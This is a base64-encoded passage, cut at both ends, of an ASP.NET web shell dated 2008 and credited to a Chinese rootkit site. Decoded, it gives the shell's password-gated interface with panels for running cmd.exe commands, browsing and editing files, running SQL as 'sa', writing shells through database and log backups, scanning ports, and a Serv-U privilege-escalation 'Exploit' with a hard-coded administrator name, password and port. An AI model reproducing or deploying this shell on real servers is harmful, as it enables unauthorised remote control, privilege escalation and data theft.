XR1cm47CgkgIH0KCSAgaWYoY21kID09ICdyZW5hbWUnICkKCSAgewoJCWZybS5nb2FjdGlvbi52YWx1ZSA9IGNtZDsKCQlmcm0udG9kby52YWx1ZSA9IHN0ciArICcsJzsKCQlzdHIgPSBwcm9tcHQoJ1BsZWFzZSBpbnB1dCBuZXcgZmlsZW5hbWU6Jywgc3RyVG1wKTsKCQlpZihzdHIgJiYgKHN0clRtcCAhPSBzdHIpKQoJCXsKCQkJZnJtLnRvZG8udmFsdWUgKz0gc3RyOwoJCQlmcm0uc3VibWl0KCk7CgkgICAgfQoJCWVsc2UgcmV0dXJuOwoJICAgfQoJICAgaWYoY21kID09ICdyZW5hbWVkaXInICkKCSAgewoJCWZybS5nb2FjdGlvbi52YWx1ZSA9IGNtZDsKCQlmcm0udG9kby52YWx1ZSA9IHN0ciArICcsJzsKCQlzdHIgPSBwcm9tcHQoJ1BsZWFzZSBpbnB1dCBuZXcgZm9sZGVybmFtZTonLCBzdHJUbXApOwoJCWlmKHN0ciAmJiAoc3RyVG1wICE9IHN0cikpCgkJewoJCQlmcm0udG9kby52YWx1ZSArPSBzdHI7CgkJCWZybS5zdWJtaXQoKTsKCSAgICB9CgkJZWxzZSByZXR1cm47CgkgICB9CgkgICBpZiAoY21kID09ICdwb3N0ZGF0YScpCgkgIHsKCSAgICAgZnJtLnRvZG8udmFsdWUgPSBzdHIudmFsdWU7CiAgICAgICAgIGZybS5nb2FjdGlvbi52YWx1ZSA9IGNtZDsKCSAgICAgZnJtLnN1Ym1pdCgpOwoJICB9CgkgIGlmIChjbWQgPT0gJ2NoYW5nZWRhdGEnKQoJICB7CgkgICAgIGZybS50b2RvLnZhbHVlID0gc3RyLnZhbHVlOwoJICAgICBmcm0uaW50ZXh0LnZhbHVlID0gc3RyLm9wdGlvbnNbc3RyLnNlbGVjdGVkSW5kZXhdLmlubmVyVGV4dAogICAgICAgICBmcm0uZ29hY3Rpb24udmFsdWUgPSBjbWQ7CgkgICAgIGZybS5zdWJtaXQoKTsKCSAgfQogICB9CiAgIAogICAgPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+CiAgICA8Zm9ybSBpZD0iZm9ybTEiIHJ1bmF0PSJzZXJ2ZXIiPjxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlciI+PGFzcDpQYW5lbCBJRD0iQmluX0xvZ2luUGFuZWwiIHJ1bmF0PSJzZXJ2ZXIiIEhlaWdodD0iNDdweCIgV2lkdGg9IjQwMXB4Ij4KICAgICAgICAgICAgPHNwYW4gY2xhc3M9IlNUWUxFMSI+CiAgICAgICAgICAgIDxhc3A6TGFiZWwgSUQ9IlBhc3NMYWJlbCIgcnVuYXQ9InNlcnZlciIgVGV4dD0iUGFzc3dvcmQ6Ij48L2FzcDpMYWJlbD4KICAgICAgICAgICAgPGFzcDpUZXh0Qm94IElEPSJwYXNzdGV4dCIgcnVuYXQ9InNlcnZlciIgVGV4dE1vZGU9IlBhc3N3b3JkIiBXaWR0aD0iMjAzcHgiPjwvYXNwOlRleHRCb3g+CiAgICAgICAgICAgIDxhc3A6QnV0dG9uIElEPSJMb2dpbkJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iRW50ZXIiIE9uQ2xpY2s9IkxvZ2luQnV0dG9uX0NsaWNrIiAvPiAgICAgICAgICAgIAogICAgICA8L3NwYW4+CiAgICAgICAgICAgIDxwIC8+CiAgICAgICAgICAgIDxzdHJvbmc+Q29weXJpZ2h0IChDKSAyMDA4IEJpbiAtPiA8YSBocmVmPSJodHRwOi8vd3d3LnJvb3RraXQubmV0LmNuIiB0YXJnZXQ9Il9ibGFuayI+V3dXLlJvT1RrSXQuTmVULkNuPC9hPjwvc3Ryb25nPgogICAgICAgICAgICA8L2FzcDpQYW5lbD48YXNwOlBhbmVsIElEPSJCaW5fTWVudVBhbmVsIiBydW5hdD0ic2VydmVyIiBIZWlnaHQ9IjU2cHgiIFdpZHRoPSI3NzFweCI+CiAgICAgICAgICAgIDxhc3A6TGFiZWwgSUQ9IlRpbWVMYWJlbCIgcnVuYXQ9InNlcnZlciIgVGV4dD0iTGFiZWwiIFdpZHRoPSIxNTBweCI+PC9hc3A6TGFiZWw+PGJyIC8+CiAgICAgICAgICAgIDxhc3A6QnV0dG9uIElEPSJNYWluQnV0dG9uIiBydW5hdD0ic2VydmVyIiBPbkNsaWNrPSJNYWluQnV0dG9uX0NsaWNrIiBUZXh0PSJTeXNpbmZvIiAvPgogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9JSVNCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIE9uQ2xpY2s9IkJpbl9JSVNCdXR0b25fQ2xpY2siIFRleHQ9IklJU1NweSIgLz4KICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkZpbGVCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIE9uQ2xpY2s9IkZpbGVCdXR0b25fQ2xpY2siIFRleHQ9IldlYlNoZWxsIiAvPgogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9DbWRCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IkNvbW1hbmQiIE9uQ2xpY2s9IkJpbl9DbWRCdXR0b25fQ2xpY2siIC8+CiAgICAgICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX1NRTEJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgT25DbGljaz0iQmluX1NRTEJ1dHRvbl9DbGljayIgVGV4dD0iU3FsVG9vbHMiIC8+Jm5ic3A7PGFzcDpCdXR0b24KICAgICAgICAgICAgICAgICAgICBJRD0iQmluX1N1QnV0dG9uIiBydW5hdD0ic2VydmVyIiBPbkNsaWNrPSJCaW5fU3VCdXR0b25fQ2xpY2siIFRleHQ9IlN1RXhwIiAvPgogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9Qb3J0QnV0dG9uIiBydW5hdD0ic2VydmVyIiBUZXh0PSJQb3J0U2NhbiIgT25DbGljaz0iQmluX1BvcnRCdXR0b25fQ2xpY2siIC8+CiAgICAgICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX1JlZ0J1dHRvbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iUmVnU2hlbGwiIE9uQ2xpY2s9IkJpbl9SZWdCdXR0b25fQ2xpY2siIC8+CiAgICAgICAgICAgIDxhc3A6QnV0dG9uIElEPSJMb2dvdXRCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIE9uQ2xpY2s9IkxvZ291dEJ1dHRvbl9DbGljayIgVGV4dD0iTG9nb3V0IiAvPjxiciAvPgogICAgICAgICAgICA8YXNwOkxhYmVsIElEPSJCaW5fRXJyb3JMYWJlbCIgcnVuYXQ9InNlcnZlciIgRW5hYmxlVmlld1N0YXRlPSJGYWxzZSI+Q29weXJpZ2h0IChDKSAyMDA4IEJpbiAtPiA8YSBocmVmPSJodHRwOi8vd3d3LnJvb3RraXQubmV0LmNuIiB0YXJnZXQ9Il9ibGFuayI+V3dXLlJvT1RrSXQuTmVULkNuPC9hPiAtPiA8YSBocmVmPSJodHRwOi8vd3d3LnJvb3RraXQubmV0LmNuL2luZGV4LmFzcHgiIHRhcmdldD0iX2JsYW5rIj5SZXZlcnNlLUlQPC9hPiA8L2FzcDpMYWJlbD48L2FzcDpQYW5lbD4KICAgICAgICA8YXNwOlBhbmVsIElEPSJCaW5fTWFpblBhbmVsIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iNzY5cHgiIEVuYWJsZVZpZXdTdGF0ZT0iRmFsc2UiIFZpc2libGU9IkZhbHNlIiBIZWlnaHQ9IjIwcHgiPgogICAgICAgICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0Ij48YXNwOkxhYmVsIElEPSJJbmZvTGFiZWwiIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSI3NjVweCIgRW5hYmxlVmlld1N0YXRlPSJGYWxzZSIgID48L2FzcDpMYWJlbD48L2Rpdj48L2FzcDpQYW5lbD48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXIiPgogICAgICAgICAgICA8YXNwOlBhbmVsIElEPSJCaW5fRmlsZVBhbmVsIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iNzY3cHgiIEVuYWJsZVZpZXdTdGF0ZT0iRmFsc2UiIFZpc2libGU9IkZhbHNlIj48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0Ij48YXNwOkxhYmVsIElEPSJCaW5fRmlsZUxhYmVsIiBydW5hdD0ic2VydmVyIiBUZXh0PSJMYWJlbCIgV2lkdGg9Ijc2NHB4Ij48L2FzcDpMYWJlbD48YnIgLz4KICAgICAgICAgICAgPGFzcDpMYWJlbCBJRD0iQmluX1VwZmlsZUxhYmVsIiBydW5hdD0ic2VydmVyIiBUZXh0PSJVcGZpbGUgOiAgIj48L2FzcDpMYWJlbD4KICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJUZXh0Qm94IiBpZD0iQmluX1VwRmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0idXBmaWxlIiBydW5hdD0ic2VydmVyIiAvPiZuYnNwOzxhc3A6VGV4dEJveCBJRD0iQmluX3VwVGV4dEJveCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjMzOXB4Ij48L2FzcDpUZXh0Qm94PiZuYnNwOwogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9Hb0J1dHRvbiIgcnVuYXQ9InNlcnZlciIgT25DbGljaz0iQmluX0dvQnV0dG9uX0NsaWNrIiBUZXh0PSJHTyIgLz4KICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl91cEJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iVXBMb2FkIiBPbkNsaWNrPSJCaW5fdXBCdXR0b25fQ2xpY2siIEVuYWJsZVZpZXdTdGF0ZT0iRmFsc2UiIC8+PGJyIC8+CiAgICAgICAgICAgIDxhc3A6TGFiZWwgSUQ9IkJpbl9DcmVhdGVMYWJlbCIgcnVuYXQ9InNlcnZlciIgVGV4dD0iQ3JlYXRlIDoiPjwvYXNwOkxhYmVsPgogICAgICAgICAgICA8YXNwOlRleHRCb3ggSUQ9IkJpbl9DcmVhdGVUZXh0Qm94IiBydW5hdD0ic2VydmVyIj48L2FzcDpUZXh0Qm94Pjxhc3A6QnV0dG9uIElEPSJCaW5fTmV3RmlsZUJ1dHRvbiIKICAgICAgICAgICAgICAgIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9Ik5ld0ZpbGUiIE9uQ2xpY2s9IkJpbl9OZXdGaWxlQnV0dG9uX0NsaWNrIiAvPgogICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX05ld2RpckJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iTmV3RGlyIiBPbkNsaWNrPSJCaW5fTmV3ZGlyQnV0dG9uX0NsaWNrIiAvPgogICAgICAgICAgICA8YnIgLz4KICAgICAgICAgICAgPGFzcDpMYWJlbCBJRD0iQmluX0NvcHlMYWJlbCIgcnVuYXQ9InNlcnZlciIgVGV4dD0iQ29weSA6IiBXaWR0aD0iMzlweCI+PC9hc3A6TGFiZWw+CiAgICAgICAgICAgICZuYnNwOwogICAgICAgICAgICA8YXNwOlRleHRCb3ggSUQ9IkJpbl9Db3B5VGV4dEJveCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjI3M3B4Ij48L2FzcDpUZXh0Qm94PgogICAgICAgICAgICA8YXNwOkxhYmVsIElEPSJCaW5fQ29weXRvTGFibGUiIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlRvOiI+PC9hc3A6TGFiZWw+CiAgICAgICAgICAgIDxhc3A6VGV4dEJveCBJRD0iQmluX0NvcHl0b1RleHRCb3giIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSIyNjhweCI+PC9hc3A6VGV4dEJveD4KICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9Db3B5QnV0dG9uIiBydW5hdD0ic2VydmVyIiBUZXh0PSJDb3B5IiBPbkNsaWNrPSJCaW5fQ29weUJ1dHRvbl9DbGljayIgLz4KICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9DdXRCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IkN1dCIgV2lkdGg9IjQ2cHgiIE9uQ2xpY2s9IkJpbl9DdXRCdXR0b25fQ2xpY2siIC8+CiAgICAgICAgICAgICAgICA8YXNwOkxhYmVsIElEPSJCaW5fRmlsZWxpc3RMYWJlbCIgcnVuYXQ9InNlcnZlciIgRW5hYmxlVmlld1N0YXRlPSJGYWxzZSI+PC9hc3A6TGFiZWw+PC9kaXY+PGRpdiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyIj4KICAgICAgICAgICAgICAgIDxhc3A6UGFuZWwgSUQ9IkJpbl9BdHRQYW5lbCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9Ijc2NXB4IiBWaXNpYmxlPSJGYWxzZSI+PGhyIC8+CiAgICAgICAgICAgICAgICAgICAgRmlsZU5hbWUgOgogICAgICAgICAgICAgICAgICAgIDxhc3A6TGFiZWwgSUQ9IkJpbl9BdHRMYWJlbCIgcnVuYXQ9InNlcnZlciIgVGV4dD0iTGFiZWwiPjwvYXNwOkxhYmVsPjxiciAvPgogICAgICAgICAgICAgICAgICAgIDxhc3A6Q2hlY2tCb3ggSUQ9IkJpbl9SZWFkT25seUNoZWNrQm94IiBydW5hdD0ic2VydmVyIiBUZXh0PSJSZWFkT25seSIgLz4KICAgICAgICAgICAgICAgICAgICA8YXNwOkNoZWNrQm94IElEPSJCaW5fU3lzdGVtQ2hlY2tCb3giIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlN5c3RlbSIgLz4KICAgICAgICAgICAgICAgICAgICA8YXNwOkNoZWNrQm94IElEPSJCaW5fSGlkZGVuQ2hlY2tCb3giIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IkhpZGRlbiIgLz4KICAgICAgICAgICAgICAgICAgICA8YXNwOkNoZWNrQm94IElEPSJCaW5fQXJjaGl2ZUNoZWNrQm94IiBydW5hdD0ic2VydmVyIiBUZXh0PSJBcmNoaXZlIiAvPgogICAgICAgICAgICAgICAgICAgIDxiciAvPgogICAgICAgICAgICAgICAgICAgIENyZWF0aW9uVGltZSA6CiAgICAgICAgICAgICAgICAgICAgPGFzcDpUZXh0Qm94IElEPSJCaW5fQ3JlYXRpb25UaW1lVGV4dEJveCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjEyM3B4Ij48L2FzcDpUZXh0Qm94PgogICAgICAgICAgICAgICAgICAgIExhc3RXcml0ZVRpbWUgOgogICAgICAgICAgICAgICAgICAgIDxhc3A6VGV4dEJveCBJRD0iQmluX0xhc3RXcml0ZVRpbWVUZXh0Qm94IiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMTI5cHgiPjwvYXNwOlRleHRCb3g+CiAgICAgICAgICAgICAgICAgICAgTGFzdEFjY2Vzc1RpbWUgOgogICAgICAgICAgICAgICAgICAgIDxhc3A6VGV4dEJveCBJRD0iQmluX0FjY2Vzc1RpbWVUZXh0Qm94IiBydW5hdD0ic2VydmVyIiBXaWR0aD0iMTE5cHgiPjwvYXNwOlRleHRCb3g+PGJyIC8+CiAgICAgICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9TZXRCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIE9uQ2xpY2s9IkJpbl9TZXRCdXR0b25fQ2xpY2siIFRleHQ9IlNldCIgLz4KICAgICAgICAgICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX1NiYWNrQnV0dG9uIiBydW5hdD0ic2VydmVyIiBPbkNsaWNrPSJCaW5fU2JhY2tCdXR0b25fQ2xpY2siIFRleHQ9IkJhY2siIC8+CiAgICAgICAgICAgICAgICAgICAgPGhyIC8+CiAgICAgICAgICAgICAgICA8L2FzcDpQYW5lbD48L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlciI+PGFzcDpQYW5lbCBJRD0iQmluX0VkaXRQYW5lbCIgcnVuYXQ9InNlcnZlciIgVmlzaWJsZT0iRmFsc2UiPjxociBzdHlsZT0id2lkdGg6IDc1N3B4IiAvPgogICAgICAgICAgICAgICAgICAgIFBhdGg6PGFzcDpUZXh0Qm94IElEPSJCaW5fRWRpdHBhdGhUZXh0Qm94IiBydW5hdD0ic2VydmVyIiBXaWR0aD0iNDU1cHgiPjwvYXNwOlRleHRCb3g+PGJyIC8+CiAgICAgICAgICAgICAgICAgICAgPGFzcDpUZXh0Qm94IElEPSJCaW5fRWRpdFRleHRCb3giIHJ1bmF0PSJzZXJ2ZXIiIFRleHRNb2RlPSJNdWx0aUxpbmUiIENvbHVtbnM9IjEwMCIgUm93cz0iMjUiIFdpZHRoPSI3NjBweCI+PC9hc3A6VGV4dEJveD48YnIgLz4KICAgICAgICAgICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX0VkaXRCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlN1bWJpdCIgT25DbGljaz0iQmluX0VkaXRCdXR0b25fQ2xpY2siIC8+Jm5ic3A7PGFzcDpCdXR0b24KICAgICAgICAgICAgICAgICAgICAgICAgSUQ9IkJpbl9CYWNrQnV0dG9uIiBydW5hdD0ic2VydmVyIiBPbkNsaWNrPSJCaW5fQmFja0J1dHRvbl9DbGljayIgVGV4dD0iQmFjayIgLz48L2FzcDpQYW5lbD48L2Rpdj48L2FzcDpQYW5lbD48L2Rpdj4KICAgICAgICAgICAgICAgIDxhc3A6UGFuZWwgSUQ9IkJpbl9DbWRQYW5lbCIgcnVuYXQ9InNlcnZlciIgSGVpZ2h0PSI1MHB4IiBXaWR0aD0iNzYzcHgiPjxociAvPgogICAgICAgICAgICAgICAgICAgIENtZFBhdGggOiAmbmJzcDs8YXNwOlRleHRCb3ggSUQ9IkJpbl9DbWRQYXRoVGV4dEJveCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjM5NXB4Ij5DOlxXaW5kb3dzXFN5c3RlbTMyXENtZC5leGU8L2FzcDpUZXh0Qm94PjxiciAvPgogICAgICAgICAgICAgICAgICAgIEFyZ3VtZW50IDoKICAgICAgICAgICAgICAgICAgICA8YXNwOlRleHRCb3ggSUQ9IkJpbl9DbWRTaGVsbFRleHRCb3giIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSIzOTVweCI+L2MgU2V0PC9hc3A6VGV4dEJveD48YnIgLz4KICAgICAgICAgICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX1J1bkJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgT25DbGljaz0iQmluX1J1bkJ1dHRvbl9DbGljayIgVGV4dD0iUnVuIiAvPgogICAgICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9InRleHQtYWxpZ246IGxlZnQiPgogICAgICAgICAgICAgICAgICAgIDxhc3A6TGFiZWwgSUQ9IkJpbl9DbWRMYWJlbCIgcnVuYXQ9InNlcnZlciIgRW5hYmxlVmlld1N0YXRlPSJGYWxzZSI+PC9hc3A6TGFiZWw+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGhyIC8+PC9hc3A6UGFuZWw+CiAgICAgICAgPGFzcDpQYW5lbCBJRD0iQmluX1NRTFBhbmVsIiBydW5hdD0ic2VydmVyIiBWaXNpYmxlPSJGYWxzZSIgV2lkdGg9Ijc2M3B4Ij4KICAgICAgICAgICAgPGhyIC8+CiAgICAgICAgICAgIENvbm5TdHJpbmcgOgogICAgICAgICAgICA8YXNwOlRleHRCb3ggSUQ9IkJpbl9TUUxjb25uVGV4dEJveCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9IjU0N3B4Ij5zZXJ2ZXI9bG9jYWxob3N0O1VJRD1zYTtQV0Q9O2RhdGFiYXNlPW1hc3RlcjtQcm92aWRlcj1TUUxPTEVEQjwvYXNwOlRleHRCb3g+PGJyIC8+CiAgICAgICAgICAgIDxhc3A6UmFkaW9CdXR0b24gSUQ9IkJpbl9TUUxSYWRpb0J1dHRvbiIgcnVuYXQ9InNlcnZlciIgQXV0b1Bvc3RCYWNrPSJUcnVlIiBPbkNoZWNrZWRDaGFuZ2VkPSJCaW5fU1FMUmFkaW9CdXR0b25fQ2hlY2tlZENoYW5nZWQiIFRleHQ9Ik1TLVNRTCIgQ2hlY2tlZD0iVHJ1ZSIgLz4KICAgICAgICAgICAgPGFzcDpSYWRpb0J1dHRvbiBJRD0iQmluX0FjY1JhZGlvQnV0dG9uIiBydW5hdD0ic2VydmVyIiBBdXRvUG9zdEJhY2s9IlRydWUiIE9uQ2hlY2tlZENoYW5nZWQ9IkJpbl9BY2NSYWRpb0J1dHRvbl9DaGVja2VkQ2hhbmdlZCIgVGV4dD0iTVMtQWNjZXNzIiAvPgogICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iU1FMX1N1bWJpdEJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iU3VtYml0IiBPbkNsaWNrPSJTUUxfU3VtYml0QnV0dG9uX0NsaWNrIiAvPjxociAvPgogICAgICAgICAgICA8YXNwOlBhbmVsIElEPSJCaW5fREJtZW51UGFuZWwiIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSI3NTlweCIgVmlzaWJsZT0iRmFsc2UiPgogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9CREJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iRGF0YUJhc2UiIE9uQ2xpY2s9IkJpbl9CREJ1dHRvbl9DbGljayIgLz4KICAgICAgICAgICAgICAgIDxhc3A6QnV0dG9uIElEPSJCaW5fU0FDTURCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlNBX0V4ZWMiIE9uQ2xpY2s9IkJpbl9TQUNNREJ1dHRvbl9DbGljayIgLz4KICAgICAgICAgICAgICAgIDxhc3A6QnV0dG9uIElEPSJCaW5fRGlyQnV0dG9uIiBydW5hdD0ic2VydmVyIiBUZXh0PSJTUUxfRGlyIiBPbkNsaWNrPSJCaW5fRGlyQnV0dG9uX0NsaWNrIiAvPjxiciAvPjxociAvPjxkaXYgc3R5bGU9InRleHQtYWxpZ246IGxlZnQiPgogICAgICAgICAgICAgICAgPGFzcDpMYWJlbCBJRD0iQmluX0RCaW5mb0xhYmVsIiBydW5hdD0ic2VydmVyIiBUZXh0PSJMYWJlbCIgRW5hYmxlVmlld1N0YXRlPSJGYWxzZSI+PC9hc3A6TGFiZWw+PC9kaXY+PC9hc3A6UGFuZWw+CiAgICAgICAgICAgIDxhc3A6UGFuZWwgSUQ9IkJpbl9BY2NQYW5lbCIgcnVuYXQ9InNlcnZlciIgSGVpZ2h0PSI1MHB4IiBXaWR0aD0iNzU5cHgiIEVuYWJsZVZpZXdTdGF0ZT0iRmFsc2UiPgogICAgICAgICAgICAgICA8YXNwOkxhYmVsIElEPSJCaW5fQWNjaW5mb0xhYmVsIiBydW5hdD0ic2VydmVyIiBUZXh0PSJMYWJlbCIgRW5hYmxlVmlld1N0YXRlPSJGYWxzZSI+PC9hc3A6TGFiZWw+PGJyIC8+CiAgICAgICAgICAgIDxhc3A6VGV4dEJveCBJRD0iQmluX0RCc3RyVGV4dEJveCIgcnVuYXQ9InNlcnZlciIgVGV4dE1vZGU9Ik11bHRpTGluZSIgV2lkdGg9IjU2OXB4Ij48L2FzcDpUZXh0Qm94PgogICAgICAgICAgICA8YXNwOkJ1dHRvbiBJRD0iQmluX0V4ZWNCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIE9uQ2xpY2s9IkJpbl9FeGVjQnV0dG9uX0NsaWNrIiBUZXh0PSJFeGVjIiAvPgogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9TQWV4ZWNCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IlNBX0V4ZWMiIE9uQ2xpY2s9IkJpbl9TQWV4ZWNCdXR0b25fQ2xpY2siIC8+PGJyIC8+CiAgICAgICAgICAgICAgICA8ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOmxlZnQiPgogICAgICAgICAgICAgICAgPGFzcDpMYWJlbCBJRD0iQmluX1Jlc0xhYmVsIiBydW5hdD0ic2VydmVyIiA+PC9hc3A6TGFiZWw+PC9kaXY+PC9hc3A6UGFuZWw+CiAgICAgICAgICAgIDxhc3A6UGFuZWwgSUQ9IkJpbl9kaXJQYW5lbCIgcnVuYXQ9InNlcnZlciIgVmlzaWJsZT0iRmFsc2UiIFdpZHRoPSI3NTlweCI+CiAgICAgICAgICAgICAgICBQYXRoIDoKICAgICAgICAgICAgICAgIDxhc3A6VGV4dEJveCBJRD0iQmluX0RpclRleHRCb3giIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSI0NDdweCI+YzpcPC9hc3A6VGV4dEJveD4KICAgICAgICAgICAgICAgIDxiciAvPgogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9saXN0QnV0dG9uIiBydW5hdD0ic2VydmVyIiBPbkNsaWNrPSJCaW5fbGlzdEJ1dHRvbl9DbGljayIgVGV4dD0iRGlyIiAvPiZuYnNwOzxhc3A6QnV0dG9uCiAgICAgICAgICAgICAgICAgICAgSUQ9IkJpbl9kYnNoZWxsQnV0dG9uIiBydW5hdD0ic2VydmVyIiBPbkNsaWNrPSJCaW5fZGJzaGVsbEJ1dHRvbl9DbGljayIgVGV4dD0iQmFrX0RCIiAvPgogICAgICAgICAgICAgICAgPGFzcDpCdXR0b24gSUQ9IkJpbl9Mb2dzaGVsbEJ1dHRvbiIgcnVuYXQ9InNlcnZlciIgVGV4dD0iQmFrX0xPRyIgT25DbGljaz0iQmluX0xvZ3NoZWxsQnV0dG9uX0NsaWNrIiAvPjxociAvPjwvYXNwOlBhbmVsPgogICAgICAgICAgICA8YnIgLz48YnIgLz4KICAgICAgICAgICAgPGRpdiBzdHlsZT0ib3ZlcmZsb3c6c2Nyb2xsOyB0ZXh0LWFsaWduOmxlZnQ7IHdpZHRoOjc3MHB4OyIgaWQ9IkJpbl9TY3JvbGwiIHJ1bmF0PSJzZXJ2ZXIiIHZpc2libGU9ImZhbHNlIiA+CiAgICAgICAgIDxhc3A6RGF0YUdyaWQgSUQ9IkJpbl9EYXRhR3JpZCIgcnVuYXQ9InNlcnZlciIgV2lkdGg9Ijc1M3B4IiBQYWdlU2l6ZT0iMjAiIENzc0NsYXNzPSJCaW5fRGF0YUdyaWQiIE9uSXRlbURhdGFCb3VuZD0iSXRlbV9EYXRhQm91bmQiIEFsbG93UGFnaW5nPSJUcnVlIiBPblBhZ2VJbmRleENoYW5nZWQ9IkJpbl9EQlBhZ2UiIE9uSXRlbUNvbW1hbmQ9Ikl0ZW1fQ29tbWFuZCI+CiAgICAgICAgICAgICA8UGFnZXJTdHlsZSBNb2RlPSJOdW1lcmljUGFnZXMiIFBvc2l0aW9uPSJUb3BBbmRCb3R0b20iIC8+CjwvYXNwOkRhdGFHcmlkPjwvZGl2PgogICAgICAgIDwvYXNwOlBhbmVsPgogICAgICAgIDxhc3A6UGFuZWwgSUQ9IkJpbl9TdVBhbmVsIiBydW5hdD0ic2VydmVyIiBXaWR0aD0iNzYzcHgiID4KICAgICAgICAgICAgPGhyIC8+CiAgICAgICAgICAgIE5hbWUgOgogICAgICAgICAgICA8YXNwOlRleHRCb3ggSUQ9IkJpbl9TdW5hbWVUZXh0Qm94IiBydW5hdD0ic2VydmVyIj5sb2NhbGFkbWluaXN0cmF0b3I8L2FzcDpUZXh0Qm94PgogICAgICAgICAgICBQYXNzIDoKICAgICAgICAgICAgPGFzcDpUZXh0Qm94IElEPSJCaW5fU3VwYXNzVGV4dEJveCIgcnVuYXQ9InNlcnZlciI+I2xAJGFrIy5sazswQFA8L2FzcDpUZXh0Qm94PgogICAgICAgICAgICBQb3J0IDoKICAgICAgICAgICAgPGFzcDpUZXh0Qm94IElEPSJCaW5fU3Vwb3J0VGV4dEJveCIgcnVuYXQ9InNlcnZlciI+NDM5NTg8L2FzcDpUZXh0Qm94PjxiciAvPgogICAgICAgICAgICBDTUQgOgogICAgICAgICAgICA8YXNwOlRleHRCb3ggSUQ9IkJpbl9TdWNtZFRleHRCb3giIHJ1bmF0PSJzZXJ2ZXIiIFdpZHRoPSI0NDdweCI+Y21kLmV4ZSAvYyBuZXQgdXNlcjwvYXNwOlRleHRCb3g+PGJyIC8+CiAgICAgICAgICAgIDxhc3A6QnV0dG9uIElEPSJCaW5fU3VleHBCdXR0b24iIHJ1bmF0PSJzZXJ2ZXIiIFRleHQ9IkV4cGxvaXQiIE9uQ2xpY2s9IkJpbl9TdWV4cEJ1dHRvbl9DbGljayIgLz48YnIgLz4KICAgICAgICAgICAgPGRpdiBzdHlsZT0idGV4dC1hbGlnbjpsZWZ0Ij4KICAgICAgICAgICAgPGhyIC8+CiAgICAgICAgICAgIDxhc3A6TGFiZWwgSUQ9IkJpbl9TdXJlc0xhYmVsIiBydW5hdD0ic2VydmVyIj48L2FzcDpMYWJlbD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvYXNwOlBhbmVsPgogICAgICAgIDxhc3A6UGFuZWwgSUQ9IkJpbl9JSVNQYW5lbCIgcnVuYXQ9InNlc